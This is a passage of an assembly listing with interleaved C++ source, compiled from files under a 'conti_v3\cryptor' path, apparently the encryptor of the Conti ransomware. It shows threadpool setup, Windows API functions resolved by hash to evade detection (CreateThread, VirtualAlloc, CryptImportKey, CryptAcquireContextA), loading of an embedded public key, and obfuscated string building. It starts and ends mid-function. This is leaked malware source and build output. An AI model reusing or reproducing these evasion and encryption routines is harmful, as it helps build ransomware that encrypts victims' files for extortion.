?PutTask@threadpool@@YAHHV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@@Z ENDP ; threadpool::PutTask
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?Create@threadpool@@YAHH_K@Z
_TEXT	SEGMENT
ThreadPoolID$ = 48
ThreadsCount$ = 56
?Create@threadpool@@YAHH_K@Z PROC			; threadpool::Create, COMDAT

; 122  : {

$LN20:
  00000	48 89 5c 24 10	 mov	 QWORD PTR [rsp+16], rbx
  00005	56		 push	 rsi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 123  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;
; 124  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  0000d	85 c9		 test	 ecx, ecx
  0000f	75 09		 jne	 SHORT $LN5@Create

; 125  : 		ThreadPoolInfo = &g_LocalThreadPool;

  00011	48 8d 35 00 00
	00 00		 lea	 rsi, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool

; 126  : 	} 

  00018	eb 0c		 jmp	 SHORT $LN4@Create
$LN5@Create:

; 127  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  0001a	83 f9 01	 cmp	 ecx, 1
  0001d	75 75		 jne	 SHORT $LN7@Create

; 128  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  0001f	48 8d 35 00 00
	00 00		 lea	 rsi, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
$LN4@Create:

; 134  : 	TAILQ_INIT(&ThreadPoolInfo->TaskList);

  00026	33 c9		 xor	 ecx, ecx
  00028	48 89 7c 24 30	 mov	 QWORD PTR [rsp+48], rdi
  0002d	48 8d 46 40	 lea	 rax, QWORD PTR [rsi+64]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  00031	41 b8 d3 40 de
	dd		 mov	 r8d, -572636973		; ddde40d3H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 134  : 	TAILQ_INIT(&ThreadPoolInfo->TaskList);

  00037	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003a	48 89 46 48	 mov	 QWORD PTR [rsi+72], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  0003e	8d 51 0f	 lea	 edx, QWORD PTR [rcx+15]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 135  : 	ThreadPoolInfo->ThreadsCount = ThreadsCount;

  00041	48 89 5e 08	 mov	 QWORD PTR [rsi+8], rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  00045	44 8d 49 49	 lea	 r9d, QWORD PTR [rcx+73]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 136  : 	ThreadPoolInfo->IsActive = FALSE;

  00049	89 4e 10	 mov	 DWORD PTR [rsi+16], ecx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 423  : 	pFunction = (void(WINAPI*)(LPCRITICAL_SECTION))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xddde40d3, 73);//GetProcAddress(hKernel32, OBFA("InitializeCriticalSection"));

  0004c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 137  : 	pInitializeCriticalSection(&ThreadPoolInfo->CriticalSection);

  00051	48 8d 4e 18	 lea	 rcx, QWORD PTR [rsi+24]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 424  : 	return pFunction(lpCriticalSection);

  00055	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 138  : 	ThreadPoolInfo->hThreads = (PHANDLE)m_malloc(sizeof(HANDLE) * ThreadsCount);

  00057	48 8d 1c dd 00
	00 00 00	 lea	 rbx, QWORD PTR [rbx*8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  0005f	48 8b cb	 mov	 rcx, rbx
  00062	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  00067	4c 8b c3	 mov	 r8, rbx
  0006a	33 d2		 xor	 edx, edx
  0006c	48 8b c8	 mov	 rcx, rax
  0006f	48 8b f8	 mov	 rdi, rax
  00072	e8 00 00 00 00	 call	 memset
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 139  : 	if (!ThreadPoolInfo->hThreads) {

  00077	48 85 ff	 test	 rdi, rdi
  0007a	48 89 3e	 mov	 QWORD PTR [rsi], rdi
  0007d	48 8b 7c 24 30	 mov	 rdi, QWORD PTR [rsp+48]
  00082	74 10		 je	 SHORT $LN7@Create

; 140  : 		return FALSE;
; 141  : 	}
; 142  : 
; 143  : 	return TRUE;

  00084	b8 01 00 00 00	 mov	 eax, 1

; 144  : }

  00089	48 8b 5c 24 38	 mov	 rbx, QWORD PTR [rsp+56]
  0008e	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00092	5e		 pop	 rsi
  00093	c3		 ret	 0
$LN7@Create:
  00094	48 8b 5c 24 38	 mov	 rbx, QWORD PTR [rsp+56]
  00099	33 c0		 xor	 eax, eax
  0009b	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0009f	5e		 pop	 rsi
  000a0	c3		 ret	 0
?Create@threadpool@@YAHH_K@Z ENDP			; threadpool::Create
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?IsActive@threadpool@@YAHH@Z
_TEXT	SEGMENT
ThreadPoolID$ = 8
?IsActive@threadpool@@YAHH@Z PROC			; threadpool::IsActive, COMDAT

; 237  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;
; 238  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  00000	85 c9		 test	 ecx, ecx
  00002	75 07		 jne	 SHORT $LN2@IsActive

; 239  : 		ThreadPoolInfo = &g_LocalThreadPool;

  00004	8b 05 10 00 00
	00		 mov	 eax, DWORD PTR ?g_LocalThreadPool@@3Uthreadpool_info@@A+16

; 246  : 	}
; 247  : 
; 248  : 	return ThreadPoolInfo->IsActive;
; 249  : }

  0000a	c3		 ret	 0
$LN2@IsActive:

; 240  : 	}
; 241  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  0000b	83 f9 01	 cmp	 ecx, 1
  0000e	75 07		 jne	 SHORT $LN4@IsActive

; 242  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  00010	8b 05 10 00 00
	00		 mov	 eax, DWORD PTR ?g_NetworkThreadPool@@3Uthreadpool_info@@A+16

; 246  : 	}
; 247  : 
; 248  : 	return ThreadPoolInfo->IsActive;
; 249  : }

  00016	c3		 ret	 0
$LN4@IsActive:

; 243  : 	}
; 244  : 	else {
; 245  : 		return FALSE;

  00017	33 c0		 xor	 eax, eax

; 246  : 	}
; 247  : 
; 248  : 	return ThreadPoolInfo->IsActive;
; 249  : }

  00019	c3		 ret	 0
?IsActive@threadpool@@YAHH@Z ENDP			; threadpool::IsActive
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?Start@threadpool@@YAHH@Z
_TEXT	SEGMENT
ThreadPoolID$ = 64
?Start@threadpool@@YAHH@Z PROC				; threadpool::Start, COMDAT

; 148  : {

$LN20:
  00000	40 53		 push	 rbx
  00002	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 149  : 	PTHREADPOOL_INFO ThreadPoolInfo = NULL;
; 150  : 	if (ThreadPoolID == threadpool::LOCAL_THREADPOOL) {

  00006	85 c9		 test	 ecx, ecx
  00008	75 09		 jne	 SHORT $LN5@Start

; 151  : 		ThreadPoolInfo = &g_LocalThreadPool;

  0000a	48 8d 1d 00 00
	00 00		 lea	 rbx, OFFSET FLAT:?g_LocalThreadPool@@3Uthreadpool_info@@A ; g_LocalThreadPool

; 152  : 	}

  00011	eb 0c		 jmp	 SHORT $LN8@Start
$LN5@Start:

; 153  : 	else if (ThreadPoolID == threadpool::NETWORK_THREADPOOL) {

  00013	83 f9 01	 cmp	 ecx, 1
  00016	75 7a		 jne	 SHORT $LN7@Start

; 154  : 		ThreadPoolInfo = &g_NetworkThreadPool;

  00018	48 8d 1d 00 00
	00 00		 lea	 rbx, OFFSET FLAT:?g_NetworkThreadPool@@3Uthreadpool_info@@A ; g_NetworkThreadPool
$LN8@Start:
  0001f	48 89 74 24 40	 mov	 QWORD PTR [rsp+64], rsi

; 158  : 	}
; 159  : 
; 160  : 	ThreadPoolInfo->IsActive = TRUE;
; 161  : 
; 162  : 	for (SIZE_T i = 0; i < ThreadPoolInfo->ThreadsCount; i++) {

  00024	33 f6		 xor	 esi, esi
  00026	48 89 7c 24 48	 mov	 QWORD PTR [rsp+72], rdi
  0002b	8b fe		 mov	 edi, esi
  0002d	c7 43 10 01 00
	00 00		 mov	 DWORD PTR [rbx+16], 1
  00034	48 39 73 08	 cmp	 QWORD PTR [rbx+8], rsi
  00038	76 43		 jbe	 SHORT $LN3@Start
  0003a	66 0f 1f 44 00
	00		 npad	 6
$LL4@Start:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 333  : 	pFunction = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x8687ce53, 82);//GetProcAddress(hKernel32, OBFA("CreateThread"));

  00040	ba 0f 00 00 00	 mov	 edx, 15
  00045	41 b8 53 ce 87
	86		 mov	 r8d, -2037920173	; 8687ce53H
  0004b	44 8d 4a 43	 lea	 r9d, QWORD PTR [rdx+67]
  0004f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 334  : 	return pFunction(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);

  00054	4c 8b cb	 mov	 r9, rbx
  00057	48 89 74 24 28	 mov	 QWORD PTR [rsp+40], rsi
  0005c	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?ThreadpoolHandler@@YAKPEAUthreadpool_info@@@Z ; ThreadpoolHandler
  00063	89 74 24 20	 mov	 DWORD PTR [rsp+32], esi
  00067	33 d2		 xor	 edx, edx
  00069	33 c9		 xor	 ecx, ecx
  0006b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 163  : 		ThreadPoolInfo->hThreads[i] = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ThreadpoolHandler, ThreadPoolInfo, 0, NULL);

  0006d	48 8b 0b	 mov	 rcx, QWORD PTR [rbx]
  00070	48 89 04 f9	 mov	 QWORD PTR [rcx+rdi*8], rax
  00074	48 ff c7	 inc	 rdi
  00077	48 3b 7b 08	 cmp	 rdi, QWORD PTR [rbx+8]
  0007b	72 c3		 jb	 SHORT $LL4@Start
$LN3@Start:

; 164  : 	}
; 165  : 
; 166  : 	return TRUE;

  0007d	48 8b 7c 24 48	 mov	 rdi, QWORD PTR [rsp+72]
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 8b 74 24 40	 mov	 rsi, QWORD PTR [rsp+64]

; 167  : }

  0008c	48 83 c4 30	 add	 rsp, 48			; 00000030H
  00090	5b		 pop	 rbx
  00091	c3		 ret	 0
$LN7@Start:

; 155  : 	}
; 156  : 	else {
; 157  : 		return FALSE;

  00092	33 c0		 xor	 eax, eax

; 167  : }

  00094	48 83 c4 30	 add	 rsp, 48			; 00000030H
  00098	5b		 pop	 rbx
  00099	c3		 ret	 0
?Start@threadpool@@YAHH@Z ENDP				; threadpool::Start
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pVirtualAlloc@@YAPEAXPEAX_KKK@Z
_TEXT	SEGMENT
lpAddress$dead$ = 48
dwSize$dead$ = 56
flAllocationType$dead$ = 64
flProtect$dead$ = 72
?pVirtualAlloc@@YAPEAXPEAX_KKK@Z PROC			; pVirtualAlloc, COMDAT

; 563  : {

$LN4:
  00000	48 83 ec 28	 sub	 rsp, 40			; 00000028H

; 564  : 	LPVOID(WINAPI * pFunction)(LPVOID, SIZE_T, DWORD, DWORD);
; 565  : 	pFunction = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x1aab6455, 59);//GetProcAddress(hKernel32, OBFA("VirtualAlloc"));

  00004	ba 0f 00 00 00	 mov	 edx, 15
  00009	41 b8 55 64 ab
	1a		 mov	 r8d, 447439957		; 1aab6455H
  0000f	44 8d 4a 2c	 lea	 r9d, QWORD PTR [rdx+44]
  00013	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 566  : 	return pFunction(lpAddress, dwSize, flAllocationType, flProtect);

  00018	ba 00 00 50 00	 mov	 edx, 5242880		; 00500000H
  0001d	41 b9 04 00 00
	00		 mov	 r9d, 4
  00023	41 b8 00 30 00
	00		 mov	 r8d, 12288		; 00003000H
  00029	33 c9		 xor	 ecx, ecx

; 567  : }

  0002b	48 83 c4 28	 add	 rsp, 40			; 00000028H

; 566  : 	return pFunction(lpAddress, dwSize, flAllocationType, flProtect);

  0002f	48 ff e0	 rex_jmp rax
?pVirtualAlloc@@YAPEAXPEAX_KKK@Z ENDP			; pVirtualAlloc
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z
_TEXT	SEGMENT
nCount$ = 48
lpHandles$ = 56
bWaitAll$dead$ = 64
dwMilliseconds$dead$ = 72
?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z PROC		; pWaitForMultipleObjects, COMDAT

; 575  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b da	 mov	 rbx, rdx

; 576  : 	DWORD(WINAPI * pFunction)(DWORD, const HANDLE*, BOOL, DWORD);
; 577  : 	pFunction = (DWORD(WINAPI*)(DWORD, const HANDLE*, BOOL, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x78b61591, 58);//GetProcAddress(hKernel32, OBFA("WaitForMultipleObjects"));

  0000d	41 b8 91 15 b6
	78		 mov	 r8d, 2025198993		; 78b61591H
  00013	ba 0f 00 00 00	 mov	 edx, 15
  00018	8b f9		 mov	 edi, ecx
  0001a	44 8d 4a 2b	 lea	 r9d, QWORD PTR [rdx+43]
  0001e	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 578  : 	return pFunction(nCount, lpHandles, bWaitAll, dwMilliseconds);

  00023	41 b9 ff ff ff
	ff		 mov	 r9d, -1			; ffffffffH
  00029	41 b8 01 00 00
	00		 mov	 r8d, 1
  0002f	48 8b d3	 mov	 rdx, rbx
  00032	8b cf		 mov	 ecx, edi

; 579  : }

  00034	48 8b 5c 24 30	 mov	 rbx, QWORD PTR [rsp+48]
  00039	48 83 c4 20	 add	 rsp, 32			; 00000020H
  0003d	5f		 pop	 rdi

; 578  : 	return pFunction(nCount, lpHandles, bWaitAll, dwMilliseconds);

  0003e	48 ff e0	 rex_jmp rax
?pWaitForMultipleObjects@@YAKKPEBQEAXHK@Z ENDP		; pWaitForMultipleObjects
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z
_TEXT	SEGMENT
hProv$ = 64
pbData$dead$ = 72
dwDataLen$dead$ = 80
hPubKey$dead$ = 88
dwFlags$dead$ = 96
phKey$ = 104
?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z PROC		; pCryptImportKey, COMDAT

; 609  : {

$LN4:
  00000	40 53		 push	 rbx
  00002	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 610  : 	BOOL(WINAPI * pFunction)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*);
; 611  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV, const BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0x70d2c0e4, 55);//GetProcAddress(hAdvapi32, OBFA("CryptImportKey"));

  00006	ba 10 00 00 00	 mov	 edx, 16
  0000b	41 b8 e4 c0 d2
	70		 mov	 r8d, 1892860132		; 70d2c0e4H
  00011	48 8b d9	 mov	 rbx, rcx
  00014	44 8d 4a 27	 lea	 r9d, QWORD PTR [rdx+39]
  00018	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 612  : 	return pFunction(hProv, pbData, dwDataLen, hPubKey, dwFlags, phKey);

  0001d	45 33 c9	 xor	 r9d, r9d
  00020	41 b8 00 10 00
	00		 mov	 r8d, 4096		; 00001000H
  00026	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?g_PublicKey@@3PAEA ; g_PublicKey
  0002d	c7 44 24 60 00
	00 00 00	 mov	 DWORD PTR dwFlags$dead$[rsp], 0
  00035	48 8b cb	 mov	 rcx, rbx

; 613  : }

  00038	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0003c	5b		 pop	 rbx

; 612  : 	return pFunction(hProv, pbData, dwDataLen, hPubKey, dwFlags, phKey);

  0003d	48 ff e0	 rex_jmp rax
?pCryptImportKey@@YAH_KPEBEK0KPEA_K@Z ENDP		; pCryptImportKey
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z
_TEXT	SEGMENT
phProv$ = 64
szContainer$dead$ = 72
szProvider$ = 80
dwProvType$dead$ = 88
dwFlags$ = 96
?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z PROC		; pCryptAcquireContextA, COMDAT

; 648  : {

$LN4:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	57		 push	 rdi
  00006	48 83 ec 30	 sub	 rsp, 48			; 00000030H

; 649  : 	BOOL(WINAPI * pFunction)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
; 650  : 	pFunction = (BOOL(WINAPI*)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD))getapi::GetProcAddressEx2(NULL, ADVAPI32_MODULE_ID, 0xad18087f, 52);//GetProcAddress(hAdvapi32, OBFA("CryptAcquireContextA"));

  0000a	ba 10 00 00 00	 mov	 edx, 16
  0000f	49 8b d8	 mov	 rbx, r8
  00012	41 b8 7f 08 18
	ad		 mov	 r8d, -1390933889	; ad18087fH
  00018	48 8b f9	 mov	 rdi, rcx
  0001b	44 8d 4a 24	 lea	 r9d, QWORD PTR [rdx+36]
  0001f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 651  : 	return pFunction(phProv, szContainer, szProvider, dwProvType, dwFlags);

  00024	8b 54 24 60	 mov	 edx, DWORD PTR dwFlags$[rsp]
  00028	41 b9 18 00 00
	00		 mov	 r9d, 24
  0002e	4c 8b c3	 mov	 r8, rbx
  00031	33 d2		 xor	 edx, edx
  00033	48 8b cf	 mov	 rcx, rdi

; 652  : }

  00036	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  0003b	48 83 c4 30	 add	 rsp, 48			; 00000030H
  0003f	5f		 pop	 rdi

; 651  : 	return pFunction(phProv, szContainer, szProvider, dwProvType, dwFlags);

  00040	48 ff e0	 rex_jmp rax
?pCryptAcquireContextA@@YAHPEA_KPEBD1KK@Z ENDP		; pCryptAcquireContextA
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp
;	COMDAT ?GetCryptoProvider@@YAHPEA_K@Z
_TEXT	SEGMENT
$T1 = 48
$T2 = 104
$T3 = 160
$T4 = 240
CryptoProvider$ = 336
?GetCryptoProvider@@YAHPEA_K@Z PROC			; GetCryptoProvider, COMDAT

; 36   : {

$LN577:
  00000	48 89 5c 24 08	 mov	 QWORD PTR [rsp+8], rbx
  00005	48 89 7c 24 10	 mov	 QWORD PTR [rsp+16], rdi
  0000a	55		 push	 rbp
  0000b	48 8d 6c 24 c0	 lea	 rbp, QWORD PTR [rsp-64]
  00010	48 81 ec 40 01
	00 00		 sub	 rsp, 320		; 00000140H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00017	c6 44 24 30 00	 mov	 BYTE PTR $T1[rsp], 0

; 63   :         if (!isDecrypted())

  0001c	33 db		 xor	 ebx, ebx

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0001e	c6 44 24 31 1b	 mov	 BYTE PTR $T1[rsp+1], 27
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\threadpool\threadpool.cpp

; 36   : {

  00023	48 8b f9	 mov	 rdi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00026	c6 44 24 32 6f	 mov	 BYTE PTR $T1[rsp+2], 111 ; 0000006fH
  0002b	c6 44 24 33 5d	 mov	 BYTE PTR $T1[rsp+3], 93	; 0000005dH
  00030	c6 44 24 34 0b	 mov	 BYTE PTR $T1[rsp+4], 11
  00035	c6 44 24 35 02	 mov	 BYTE PTR $T1[rsp+5], 2
  0003a	c6 44 24 36 0e	 mov	 BYTE PTR $T1[rsp+6], 14
  0003f	c6 44 24 37 02	 mov	 BYTE PTR $T1[rsp+7], 2
  00044	c6 44 24 38 66	 mov	 BYTE PTR $T1[rsp+8], 102 ; 00000066H
  00049	c6 44 24 39 11	 mov	 BYTE PTR $T1[rsp+9], 17
  0004e	c6 44 24 3a 13	 mov	 BYTE PTR $T1[rsp+10], 19
  00053	c6 44 24 3b 03	 mov	 BYTE PTR $T1[rsp+11], 3
  00058	c6 44 24 3c 7e	 mov	 BYTE PTR $T1[rsp+12], 126 ; 0000007eH
  0005d	c6 44 24 3d 6c	 mov	 BYTE PTR $T1[rsp+13], 108 ; 0000006cH
  00062	c6 44 24 3e 57	 mov	 BYTE PTR $T1[rsp+14], 87 ; 00000057H
  00067	c6 44 24 3f 7e	 mov	 BYTE PTR $T1[rsp+15], 126 ; 0000007eH
  0006c	c6 44 24 40 5d	 mov	 BYTE PTR $T1[rsp+16], 93 ; 0000005dH
  00071	c6 44 24 41 63	 mov	 BYTE PTR $T1[rsp+17], 99 ; 00000063H
  00076	c6 44 24 42 60	 mov	 BYTE PTR $T1[rsp+18], 96 ; 00000060H
  0007b	c6 44 24 43 13	 mov	 BYTE PTR $T1[rsp+19], 19
  00080	c6 44 24 44 2a	 mov	 BYTE PTR $T1[rsp+20], 42 ; 0000002aH
  00085	c6 44 24 45 2d	 mov	 BYTE PTR $T1[rsp+21], 45 ; 0000002dH
  0008a	c6 44 24 46 76	 mov	 BYTE PTR $T1[rsp+22], 118 ; 00000076H
  0008f	c6 44 24 47 13	 mov	 BYTE PTR $T1[rsp+23], 19
  00094	c6 44 24 48 57	 mov	 BYTE PTR $T1[rsp+24], 87 ; 00000057H
  00099	c6 44 24 49 7e	 mov	 BYTE PTR $T1[rsp+25], 126 ; 0000007eH
  0009e	c6 44 24 4a 60	 mov	 BYTE PTR $T1[rsp+26], 96 ; 00000060H
  000a3	c6 44 24 4b 13	 mov	 BYTE PTR $T1[rsp+27], 19
  000a8	c6 44 24 4c 76	 mov	 BYTE PTR $T1[rsp+28], 118 ; 00000076H
  000ad	c6 44 24 4d 03	 mov	 BYTE PTR $T1[rsp+29], 3
  000b2	c6 44 24 4e 2d	 mov	 BYTE PTR $T1[rsp+30], 45 ; 0000002dH
  000b7	c6 44 24 4f 13	 mov	 BYTE PTR $T1[rsp+31], 19
  000bc	c6 44 24 50 7c	 mov	 BYTE PTR $T1[rsp+32], 124 ; 0000007cH
  000c1	c6 44 24 51 0b	 mov	 BYTE PTR $T1[rsp+33], 11
  000c6	c6 44 24 52 20	 mov	 BYTE PTR $T1[rsp+34], 32 ; 00000020H
  000cb	c6 44 24 53 05	 mov	 BYTE PTR $T1[rsp+35], 5
  000d0	c6 44 24 54 11	 mov	 BYTE PTR $T1[rsp+36], 17
  000d5	c6 44 24 55 02	 mov	 BYTE PTR $T1[rsp+37], 2
  000da	c6 44 24 56 69	 mov	 BYTE PTR $T1[rsp+38], 105 ; 00000069H
  000df	c6 44 24 57 0b	 mov	 BYTE PTR $T1[rsp+39], 11
  000e4	c6 44 24 58 57	 mov	 BYTE PTR $T1[rsp+40], 87 ; 00000057H
  000e9	c6 44 24 59 05	 mov	 BYTE PTR $T1[rsp+41], 5
  000ee	c6 44 24 5a 6c	 mov	 BYTE PTR $T1[rsp+42], 108 ; 0000006cH
  000f3	c6 44 24 5b 6f	 mov	 BYTE PTR $T1[rsp+43], 111 ; 0000006fH
  000f8	c6 44 24 5c 5d	 mov	 BYTE PTR $T1[rsp+44], 93 ; 0000005dH
  000fd	c6 44 24 5d 13	 mov	 BYTE PTR $T1[rsp+45], 19
  00102	c6 44 24 5e 24	 mov	 BYTE PTR $T1[rsp+46], 36 ; 00000024H
  00107	c6 44 24 5f 0b	 mov	 BYTE PTR $T1[rsp+47], 11
  0010c	c6 44 24 60 02	 mov	 BYTE PTR $T1[rsp+48], 2
